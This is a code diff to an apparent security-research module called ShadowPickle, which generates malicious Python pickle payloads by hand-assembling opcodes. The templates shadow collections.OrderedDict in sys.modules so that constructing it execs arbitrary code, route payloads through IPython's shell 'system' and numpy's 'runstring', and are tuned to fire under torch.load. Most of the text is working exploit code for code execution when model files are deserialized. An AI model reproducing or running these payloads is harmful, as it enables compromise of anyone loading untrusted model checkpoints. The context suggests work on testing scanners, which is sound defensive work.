@@ -15,114 +15,162 @@ from typing import Any
 
 
 class AttackTemplate:
-    """Base class for all ShadowPickle attack templates."""
+    """Base class for all ShadowPickle attack templates.
+
+    ``sink_kind`` selects how ``payload_code`` is delivered to the target
+    callable at load time, so the payload always triggers the side effect:
+      * ``"exec"``      -- the callable execs the code string directly.
+      * ``"system"``    -- the callable runs a shell command; the code is
+                           wrapped in ``python3 -c``.
+      * ``"runstring"`` -- the callable execs the code in a local namespace
+                           (takes ``(code, locals_dict)``).
+    """
+
+    sink_kind = "exec"
+
+    def __init__(self, module_name: str, callable_name: str):
+        self.module_name = module_name
+        self.callable_name = callable_name
 
     def generate_pickle_payload(self, payload_code: str) -> bytes:
         """Return the pickle bytes that trigger this attack with the given payload code."""
         raise NotImplementedError
 
+    def _args_for(self, payload_code: str) -> tuple:
+        """Wrap payload_code into the argument tuple expected by this sink."""
+        if self.sink_kind == "system":
+            return (f"python3 -c {payload_code!r}",)
+        if self.sink_kind == "runstring":
+            return (payload_code, {})
+        return (payload_code,)
+
 
 class OverwrittenModuleTemplate(AttackTemplate):
     """
     T2.1: Overwritten-Module Attack Template.
-    
+
     This attack shadows a standard/builtin class (e.g. collections.OrderedDict)
     with a malicious implementation that runs exec() during instantiation.
+
+    The trigger pickle is self-contained: stage 1 exec()s the shadow setup
+    (installing a malicious ``collections`` module into ``sys.modules``) and
+    stage 2 GLOBALs ``collections.OrderedDict`` -- now the shadowed class --
+    with the payload string as its argument, so ``exec(payload_code)`` runs on
+    instantiation. No shadow-module file needs to be deployed into the sandbox,
+    so the same bytes work in the validity oracle and the DynaHug container.
     """
 
     def __init__(self, module_name: str = "collections", class_name: str = "OrderedDict"):
-        self.module_name = module_name
-        self.class_name = class_name
+        super().__init__(module_name, class_name)
+        self.class_name = class_name  # base stores it as callable_name
 
     def generate_module_code(self) -> str:
-        """
-        Generate the Python source code of the shadow module.
-        When placed in the python path (shadowing the real module), this code
-        dynamically loads the real module, copies its attributes, and overrides
-        the target class to execute any string argument in __new__.
+        """Return Python source that replaces ``sys.modules[module]`` with a shadow
+        module whose ``class_name`` executes string arguments in ``__new__``.
+
+        The real module is captured *first* (before the shadow is installed),
+        so ``__new__`` can delegate to the genuine implementation after running
+        the payload -- keeping the loaded object structurally valid.
         """
         return f'''# Auto-generated shadow module for {self.module_name}.{self.class_name}
 import sys
-import os
-import importlib
+import types
+import collections as _real_collections
 
-# Remove current directory from sys.path to find and import the original/real module
-self_dir = os.path.dirname(__file__)
-original_path = sys.path.copy()
-sys.path = [p for p in sys.path if p != self_dir]
-
-# Temporarily remove this module from sys.modules to prevent circular import
-shadow_module = sys.modules.pop("{self.module_name}", None)
-
-try:
-    real_module = importlib.import_module("{self.module_name}")
-finally:
-    sys.path = original_path
-    if shadow_module is not None:
-        sys.modules["{self.module_name}"] = shadow_module
-
-# Copy all attributes from the real module to this shadow module's namespace
-globals().update({{k: v for k, v in real_module.__dict__.items() if k not in ["__name__", "__file__", "__package__", "__loader__", "__spec__"]}})
-
-# Define the malicious subclass that overrides __new__ and __init__ to execute string inputs
-class Malicious{self.class_name}(real_module.{self.class_name}):
-    def __new__(cls, *args, **kwargs):
+class _Shadow{self.class_name}(_real_collections.{self.class_name}):
+    # _real is bound as a default argument at class-definition time so the
+    # methods never need a runtime global lookup: exec() (and the C pickle
+    # accelerator's dispatch) may resolve globals from an unrelated module
+    # dict (e.g. torch.serialization), which must not break delegation.
+    def __new__(cls, *args, _real=_real_collections.{self.class_name}, **kwargs):
         if args and isinstance(args[0], str):
-            # Run the payload code
             exec(args[0])
-            # Return a clean instance of the base class
-            return real_module.{self.class_name}.__new__(cls)
-        return real_module.{self.class_name}.__new__(cls, *args, **kwargs)
+            return _real.__new__(cls)
+        return super().__new__(cls)
 
     def __init__(self, *args, **kwargs):
-        if args and isinstance(args[0], str):
-            real_module.{self.class_name}.__init__(self)
-        else:
-            real_module.{self.class_name}.__init__(self, *args, **kwargs)
+        if not (args and isinstance(args[0], str)):
+            super().__init__(*args, **kwargs)
 
-{self.class_name} = Malicious{self.class_name}
+_shadow = types.ModuleType({self.module_name!r})
+_shadow.{self.class_name} = _Shadow{self.class_name}
+_shadow.__dict__.update({{
+    k: v for k, v in _real_collections.__dict__.items()
+    if not k.startswith("__") and k != {self.class_name!r}
+}})
+sys.modules[{self.module_name!r}] = _shadow
 '''
 
     def generate_pickle_payload(self, payload_code: str) -> bytes:
-        """Generate the pickle bytes instantiating the overwritten module class with payload_code."""
-        return _generate_payload(self.module_name, self.class_name, payload_code)
+        """Generate a two-stage pickle: install the shadow module, then trigger
+        the (now shadowed) class with payload_code as its constructor argument."""
+        from pipeline.opcodes import OPCODES_BY_NAME
+
+        setup = self.generate_module_code()
+        parts = []
+        # Stage 1: exec(setup, {}) installs the shadow module in sys.modules.
+        # The explicit globals dict forces module-scope execution (globals ==
+        # locals); without it, exec called from a function frame (e.g. the C
+        # pickle dispatch invoked by torch.load) binds the import names into
+        # the function's locals, which a class body can never see.
+        parts.append(OPCODES_BY_NAME["GLOBAL"].code + b"builtins\nexec\n")
+        parts.append(pickle.dumps((setup, {}), protocol=2)[2:-1])  # strip PROTO/STOP
+        parts.append(OPCODES_BY_NAME["REDUCE"].code)
+        parts.append(OPCODES_BY_NAME["POP"].code)
+        # Stage 2: instantiate the shadowed class; its __new__ execs the payload.
+        parts.append(OPCODES_BY_NAME["GLOBAL"].code
+                     + f"{self.module_name}\n{self.class_name}\n".encode("latin1"))
+        parts.append(pickle.dumps((payload_code,), protocol=2)[2:-1])
+        parts.append(OPCODES_BY_NAME["REDUCE"].code)
+        # No trailing POP: these streams are loaded standalone (pickle.loads in
+        # inject_payload_into_torch), so the stack must be non-empty at STOP --
+        # leave the constructed object on the stack for loads to return.
+        parts.append(OPCODES_BY_NAME["STOP"].code)
+        return b"".join(parts)
 
 
 class PyPIInjectedTemplate(AttackTemplate):
     """
     T2.2: PyPI-Injected Attack Template.
-    
-    Imports a callable from a third-party PyPI library that naturally executes code.
+
+    Imports a callable from a third-party PyPI library that naturally executes
+    code. Defaults to ``IPython.utils.process.system`` (IPython is installed in
+    the base image), a shell-command sink.
     """
 
-    def __init__(self, module_name: str, callable_name: str):
-        self.module_name = module_name
-        self.callable_name = callable_name
+    sink_kind = "system"
+
+    def __init__(self, module_name: str = "IPython.utils.process", callable_name: str = "system"):
+        super().__init__(module_name, callable_name)
 
     def generate_pickle_payload(self, payload_code: str) -> bytes:
         """Generate the pickle bytes calling the PyPI library callable with payload_code."""
-        return _generate_payload(self.module_name, self.callable_name, payload_code)
+        return _generate_payload(self.module_name, self.callable_name,
+                                 self._args_for(payload_code))
 
 
 class ExternalModuleTemplate(AttackTemplate):
     """
     T2.3: External-Module Attack Template.
-    
+
     Imports a built-in/existing callable (like numpy.testing._private.utils.runstring)
-    to execute code.
+    to execute code. Defaults to ``runstring``, which execs code in a namespace.
     """
 
-    def __init__(self, module_name: str, callable_name: str):
-        self.module_name = module_name
-        self.callable_name = callable_name
+    sink_kind = "runstring"
+
+    def __init__(self, module_name: str = "numpy.testing._private.utils",
+                 callable_name: str = "runstring"):
+        super().__init__(module_name, callable_name)
 
     def generate_pickle_payload(self, payload_code: str) -> bytes:
         """Generate the pickle bytes calling the external module callable with payload_code."""
-        return _generate_payload(self.module_name, self.callable_name, payload_code)
+        return _generate_payload(self.module_name, self.callable_name,
+                                 self._args_for(payload_code))
 
 
-def _generate_payload(module_name: str, class_name: str, payload_code: str) -> bytes:
-    """Generate pickle bytes that call ``module_name.class_name`` with payload_code.
+def _generate_payload(module_name: str, class_name: str, args: tuple) -> bytes:
+    """Generate pickle bytes that call ``module_name.class_name`` with ``args``.
 
     Built directly from opcodes (``GLOBAL <module> <name> <args> REDUCE POP STOP``)
     so the module never has to be importable at dump time. Dotted modules such
@@ -132,15 +180,40 @@ def _generate_payload(module_name: str, class_name: str, payload_code: str) -> b
     """
     from pipeline.opcodes import OPCODES_BY_NAME
 
-    args_bytes = pickle.dumps((payload_code,), protocol=2)[2:-1]  # strip PROTO/STOP
+    args_bytes = pickle.dumps(args, protocol=2)[2:-1]  # strip PROTO/STOP
+    # No trailing POP: the stream is loaded standalone (pickle.loads inside
+    # inject_payload_into_torch), so STOP must see a non-empty stack.
     return (
         OPCODES_BY_NAME["GLOBAL"].code
         + f"{module_name}\n{class_name}\n".encode("latin1")
         + args_bytes
         + OPCODES_BY_NAME["REDUCE"].code
-        + OPCODES_BY_NAME["POP"].code
         + OPCODES_BY_NAME["STOP"].code
     )
+
+
+# Family id -> template instance. ``gadget`` is handled by the generator's
+# dangerous-callable injection path, not by a template.
+FAMILY_TEMPLATES: dict[str, AttackTemplate] = {
+    "overwritten": OverwrittenModuleTemplate(),
+    "pypi_injected": PyPIInjectedTemplate(),
+    "external": ExternalModuleTemplate(),
+}
+
+FAMILIES: tuple[str, ...] = ("gadget",) + tuple(FAMILY_TEMPLATES)
+
+# Stable per-family mutation_template label recorded in the campaign DB.
+FAMILY_LABELS: dict[str, str] = {
+    "gadget": "inject_payload_into_torch",
+    "overwritten": "shadowpickle_overwritten",
+    "pypi_injected": "shadowpickle_pypi_injected",
+    "external": "shadowpickle_external",
+}
+
+
+def family_template(family: str) -> AttackTemplate | None:
+    """Return the template for a ShadowPickle family id, or None for 'gadget'."""
+    return FAMILY_TEMPLATES.get(family)
 
 
 def _get_placeholder_class(module_name: str, class_name: str) -> type:
